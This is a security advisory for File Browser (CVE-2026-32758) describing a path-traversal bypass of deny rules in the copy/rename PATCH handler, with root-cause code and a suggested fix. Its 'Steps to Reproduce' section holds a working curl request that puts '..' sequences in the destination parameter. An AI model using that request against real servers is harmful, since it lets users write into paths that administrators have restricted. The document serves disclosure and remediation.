# [M] File Browser has an Access Rule Bypass via Path Traversal in Copy/Rename Destination Parameter

## Summary
Severity: Medium
Advisory: GHSA-9f3r-2vgw-m8xp
CVE: CVE-2026-32758
CWE: CWE-22, CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-9f3r-2vgw-m8xp
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.62.0

## Details
## Description

The `resourcePatchHandler` in `http/resource.go` validates the destination path against configured access rules before the path is cleaned/normalized. The rules engine (`rules/rules.go`) uses literal string prefix matching (`strings.HasPrefix`) or regex matching against the raw path. The actual file operation (`fileutils.Copy`, `patchAction`) subsequently calls `path.Clean()` which resolves `..` sequences, producing a different effective path than the one validated.

This allows an authenticated user with Create or Rename permissions to bypass administrator-configured deny rules by including `..` (dot-dot) path traversal sequences in the `destination` query parameter of a PATCH request.

## Steps to Reproduce

### 1. Verify the rule works normally

```bash
# This should return 403 Forbidden
curl -X PATCH \
  -H "X-Auth: <alice_jwt>" \
  "http://host/api/resources/public/test.txt?action=copy&destination=%2Frestricted%2Fcopied.txt"
```

### 2. Exploit the bypass

```bash
# This should succeed despite the deny rule
curl -X PATCH \
  -H "X-Auth: <alice_jwt>" \
  "http://host/api/resources/public/test.txt?action=copy&destination=%2Fpublic%2F..%2Frestricted%2Fcopied.txt"
```

### 3. Result

The file `test.txt` is copied to `/restricted/copied.txt` despite the deny rule for `/restricted/`.

## Root Cause Analysis

In `http/resource.go:209-257`:

```go
dst := r.URL.Query().Get("destination")       // line 212
dst, err := url.QueryUnescape(dst)             // line 214 — dst contains ".."
if !d.Check(src) || !d.Check(dst) {            // line 215 — CHECK ON UNCLEANED PATH
    return http.StatusForbidden, nil
}
```

In `rules/rules.go:29-35`:

```go
func (r *Rule) Matches(path string) bool {
    if r.Regex {
        return r.Regexp.MatchString(path)      // regex on literal path
    }
    return strings.HasPrefix(path, r.Path)     // prefix on literal path
}
```

In `fileutils/copy.go:12-17`:

```go
func Copy(afs afero.Fs, src, dst string, ...) error {
    if dst = path.Clean("/" + dst); dst == "" { // CLEANING HAPPENS HERE, AFTER CHECK
        return os.ErrNotExist
    }
```

The rules check sees `/public/../restricted/copied.txt` (no match for `/restricted/` prefix).
The file operation resolves it to `/restricted/copied.txt` (within the restricted path).

## Secondary Issue

In the same handler, the error from `url.QueryUnescape` is checked after `d.Check()` runs (lines 214-220), meaning the rules check executes on a potentially malformed string if unescaping fails.

## Impact

An authenticated user with Copy (Create) or Rename permission can write or move files into any path within their scope that is protected by deny rules. This bypasses both:

- Prefix-based rules: `strings.HasPrefix` on uncleaned path misses the match
- Regex-based rules: Standard patterns like `^/restricted/.*` fail on uncleaned path

Cannot be used to:

- Escape the user's BasePathFs scope (afero prevents this)
- Read from restricted paths (GET handler uses cleaned `r.URL.Path`)

## Suggested Fix

Clean the destination path before the rules check:

```go
dst, err := url.QueryUnescape(dst)
if err != nil {
    return errToStatus(err), err
}
dst = path.Clean("/" + dst)
src = path.Clean("/" + src)
if !d.Check(src) || !d.Check(dst) {
    return http.StatusForbidden, nil
}
if dst == "/" || src == "/" {
    return http.StatusForbidden, nil
}
```

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-9f3r-2vgw-m8xp
- https://nvd.nist.gov/vuln/detail/CVE-2026-32758
- https://github.com/filebrowser/filebrowser/commit/4bd7d69c82163b201a987e99c0c50d7ecc6ee5f1
- https://github.com/filebrowser/filebrowser
- https://github.com/filebrowser/filebrowser/releases/tag/v2.62.0
